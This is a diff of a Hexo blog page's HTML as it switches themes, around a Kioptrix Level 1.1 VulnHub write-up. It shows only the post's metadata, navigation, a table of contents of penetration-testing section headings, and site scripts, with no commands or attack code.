-            其他文章
-            <span data-number="02"></span>
-        </h5>
-    </div>
-    
-        <div class="col-lg-6">
-    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
-        <div class="trm-older-publication">
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Kioptrix Level 1.1(#2)</li>
+        <li><strong>Author:</strong> MADISUN</li>
+        <li><strong>Created at
+                :</strong> 2024-02-03 17:08:24</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-03-09 17:10:53
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/02/03/Kioptrix_Level_1.1/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
             
-            <a class="trm-op-top trm-anima-link" href="/2024/02/11/Kioptrix_Level_1.2/">
-                <span class="trm-op-cover">
-                    <img alt="cover" class="no-fancybox" src="/img/block.jpg">
-                </span>
-                <h6 class="trm-op-title">Kioptrix Level 1.2(#3)</h6>
-            </a>
-            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/02/11</li>
-                <li>13:11</li>
-                <li>类OSCP靶机练习</li>
-            </ul>
-        </div>
-    </div>
-</div>
-    
-    
-        <div class="col-lg-6">
-    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
-        <div class="trm-older-publication">
+
             
-            <a class="trm-op-top trm-anima-link" href="/2024/01/29/Kioptrix_Level_1/">
-                <span class="trm-op-cover">
-                    <img alt="cover" class="no-fancybox" src="/img/block.jpg">
-                </span>
-                <h6 class="trm-op-title">Kioptrix Level 1</h6>
-            </a>
-            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
-            <ul class="trm-card-data trm-label">
-                <li>24/01/29</li>
-                <li>21:20</li>
-                <li>类OSCP靶机练习</li>
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
+                    </li>
+                
             </ul>
-        </div>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/02/11/Kioptrix_Level_1.2/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Kioptrix Level 1.2(#3)</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/01/29/Kioptrix_Level_1/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Kioptrix Level 1</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Kioptrix Level 1.1(#2)</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Kioptrix-Level-1-1-2"><span class="nav-text">Kioptrix Level 1.1(#2)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="nav-text">渗透思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E4%BD%93%E9%AA%8C"><span class="nav-text">我的体验</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E6%B8%97%E9%80%8F"><span class="nav-text">web渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sql%E6%B3%A8%E5%85%A5"><span class="nav-text">Sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E%EF%BC%9ARCE%E6%BC%8F%E6%B4%9E"><span class="nav-text">寻找漏洞：RCE漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#0x01-bash%E5%BB%BA%E7%AB%8Btcp%E8%BF%9E%E6%8E%A5"><span class="nav-text">0x01 bash建立tcp连接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#0x02-msfvenom%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8"><span class="nav-text">0x02 msfvenom生成后门</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-%E6%8F%90%E6%9D%83-Linux-Privilege-Escalation"><span class="nav-text">Linux 提权  Linux Privilege Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">提权信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BECentOS-4-5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83%E8%84%9A%E6%9C%AC"><span class="nav-text">寻找CentOS 4.5漏洞利用提权脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%86%E8%84%9A%E6%9C%AC%E4%BC%A0%E5%88%B0%E9%9D%B6%E6%9C%BA"><span class="nav-text">将脚本传到靶机</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-Python-SimpleHTTPServer-%E5%BF%AB%E9%80%9F%E5%85%B1%E4%BA%AB%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="nav-text">0x01 Python SimpleHTTPServer 快速共享当前目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-service-apache2-start"><span class="nav-text">0x02 service apache2 start</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC"><span class="nav-text">编译运行脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93"><span class="nav-text">学习总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E631%E7%AB%AF%E5%8F%A3-ipp%E6%9C%8D%E5%8A%A1-CUPS-1-1"><span class="nav-text">关于631端口 ipp服务 CUPS 1.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E6%96%B9%E5%90%91"><span class="nav-text">关于渗透方向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-Linux-%E6%8F%90%E6%9D%83"><span class="nav-text">关于 Linux 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E4%B8%BB%E6%9C%BA%E9%97%B4%E4%BC%A0%E6%96%87%E4%BB%B6-via-http"><span class="nav-text">关于主机间传文件 via http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eweb%E6%B8%97%E9%80%8Fsql%E6%B3%A8%E5%85%A5"><span class="nav-text">关于web渗透sql注入</span></a></li></ol></li></ol></li></ol>
+
     </div>
 </div>
+        </div>
     
 </div>
 
-    
 
 
+                
 
-                    <div class="trm-divider footer-divider"></div>
+            </div>
 
-                    <!-- footer -->
-                    <footer class="trm-scroll-animation">
+            
 
-    
-
-    
-
-    
-        <div class="trm-footer-item">
-            <span>
-                由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1
-            </span>
-            <span class="footer-separator" data-separator=" | "></span>
-            <span> 
-                主题 - 
-                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
-                v2.1.10
-            </span>
         </div>
-      
 
-    
-        <div class="trm-footer-item blog-run-long"></div>
-     
-
-     
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">MADISUN</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        8 posts in total
+                    </span>
+                    
+                        <span>
+                            7.1k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
 </footer>
-                    <!-- footer end -->
+        </div>
+    </div>
 
-                </div>
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
             </div>
         </div>
     </div>
 </div>
-<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
-<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
-<script type="text/javascript" src="/js/firework.js"></script>
+
+    
+
+</main>
 
 
-            <!-- body end -->
+    
+<script src="/js/libs/Swup.min.js"></script>
 
-            
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
 
-    <div id="post-toc" class="trm-post-toc">
-      <div class="trm-post-toc-header">
-        目录导航
-				<span id="post-toc-top">
-					置顶
-				</span>
-      </div>
-      <div class="trm-post-toc-content">
-        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-1" title=" Kioptrix Level 1.1(#2)"><a rel="nofollow" class="trm-toc-link" href="#kioptrix-level-112"><span class="trm-toc-number">1.</span> <span class="trm-toc-text"> Kioptrix Level 1.1(#2)</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title=" 渗透思路"><a rel="nofollow" class="trm-toc-link" href="#渗透思路"><span class="trm-toc-number">1.1.</span> <span class="trm-toc-text"> 渗透思路</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title=" 信息收集"><a rel="nofollow" class="trm-toc-link" href="#信息收集"><span class="trm-toc-number">1.1.1.</span> <span class="trm-toc-text"> 信息收集</span></a></li><li class="trm-toc-item trm-toc-level-3" title=" web渗透"><a rel="nofollow" class="trm-toc-link" href="#web渗透"><span class="trm-toc-number">1.1.2.</span> <span class="trm-toc-text"> web渗透</span></a></li><li class="trm-toc-item trm-toc-level-3" title=" Linux 提权  Linux Privilege Escalation"><a rel="nofollow" class="trm-toc-link" href="#linux-提权-linux-privilege-escalation"><span class="trm-toc-number">1.1.3.</span> <span class="trm-toc-text"> Linux 提权  Linux Privilege Escalation</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title=" 学习总结"><a rel="nofollow" class="trm-toc-link" href="#学习总结"><span class="trm-toc-number">1.2.</span> <span class="trm-toc-text"> 学习总结</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title=" 关于631端口 ipp服务 CUPS 1.1"><a rel="nofollow" class="trm-toc-link" href="#关于631端口-ipp服务-cups-11"><span class="trm-toc-number">1.2.1.</span> <span class="trm-toc-text"> 关于631端口 ipp服务 CUPS 1.1</span></a></li><li class="trm-toc-item trm-toc-level-3" title=" 关于渗透方向"><a rel="nofollow" class="trm-toc-link" href="#关于渗透方向"><span class="trm-toc-number">1.2.2.</span> <span class="trm-toc-text"> 关于渗透方向</span></a></li><li class="trm-toc-item trm-toc-level-3" title=" 关于 Linux 提权"><a rel="nofollow" class="trm-toc-link" href="#关于-linux-提权"><span class="trm-toc-number">1.2.3.</span> <span class="trm-toc-text"> 关于 Linux 提权</span></a></li><li class="trm-toc-item trm-toc-level-3" title=" 关于主机间传文件 via http"><a rel="nofollow" class="trm-toc-link" href="#关于主机间传文件-via-http"><span class="trm-toc-number">1.2.4.</span> <span class="trm-toc-text"> 关于主机间传文件 via http</span></a></li><li class="trm-toc-item trm-toc-level-3" title=" 关于web渗透sql注入"><a rel="nofollow" class="trm-toc-link" href="#关于web渗透sql注入"><span class="trm-toc-number">1.2.5.</span> <span class="trm-toc-text"> 关于web渗透sql注入</span></a></li></ol></li></ol></li></ol>
-      </div>
-    </div>
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
 
-            
-<div class="trm-fixed-container">
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
     
-        <div class="trm-fixed-btn post-toc-btn" data-title="目录">
-            <i class="iconfont fas fa-th-list"></i>
-        </div>
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
     
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
     
-        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
-            <i class="iconfont fas fa-book-reader"></i>
-        </div>
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
     
+<script src="/js/tools/runtime.js"></script>
+
     
-    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
-        <i class="iconfont fas fa-arrow-up"></i>
-    </div>
-</div>
-        </div>
-      </div>
-      <!-- scroll container end -->
-  </div>
-  <!-- app wrapper end -->
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
 
   
-    <div class="trm-search-popup">
-        <div class="trm-search-wrapper">
-            <div class="form trm-search-form">
-                <div class="trm-search-input-icon">
-                    <i class="iconfont fas fa-search"></i>
-                </div>
-                <input class="trm-search-input" type="text" placeholder="搜索文章...">
-                <div class="trm-search-btn-close">
-                    <i class="iconfont fas fa-times"></i>
-                </div>
-            </div>
-            <div class="trm-search-result-container">
-                <div class="trm-search-empty">
-                    请输入关键词进行搜索
-                </div>
-            </div>
-            <div class="trm-search-footer">
-                <div class="trm-search-stats"></div>
-                <ul class="trm-search-commands">
-                    <li>
-                        <kbd class="command-palette-commands-key">
-                            <svg width="15" height="15" aria-label="Escape key" role="img">
-                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
-                                    stroke-width="1.2">
-                                    <path
-                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
-                                    </path>
-                                </g>
-                            </svg>
-                        </kbd>
-                        <span class="command-palette-Label">to close</span>
-                    </li>
-                </ul>
-            </div>
-        </div>
-    </div>
+<script src="/js/libs/Typed.min.js"></script>
 
-  <!-- Plugin -->
+  
+<script src="/js/plugins/typed.js" type="module"></script>
 
 
 
 
-    
-    
-<script src="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
-
-    
-<script src="https://npm.elemecdn.com/swiper@4.5.1/dist/js/swiper.min.js"></script>
 
 
-    
-        <script src="/js/plugins/typing.js?v=2.1.10"></script>
-    
 
+
+
+<div class="post-scripts" data-swup-reload-script>
     
         
-<script src="https://npm.elemecdn.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/tools/tocToggle.js" type="module"></script>
 
-        <script src="/js/plugins/local_search.js?v=2.1.10"></script>
-    
+<script src="/js/layouts/toc.js" type="module"></script>
 
-    <!-- 数学公式 -->
-    
-
-    <!-- 评论插件 -->
-    
-        
-
-        
-    
-
-
-
-<!-- CDN -->
-
+<script src="/js/plugins/tabs.js" type="module"></script>
 
     
-
-    
-
-    
+</div>
 
 
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
 
 
-    <!-- Service Worker -->
-    
-    <!-- baidu push -->
-    
+<script src="/js/plugins/aplayer.js"></script>
 
-
-<script id="async-script" src="/js/main.js?v=2.1.10"></script>
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"react":{"opacity":0.8},"dialog":{"enable":true},"display":{"hOffset":30},"log":false});</script></body>
-
 </html>
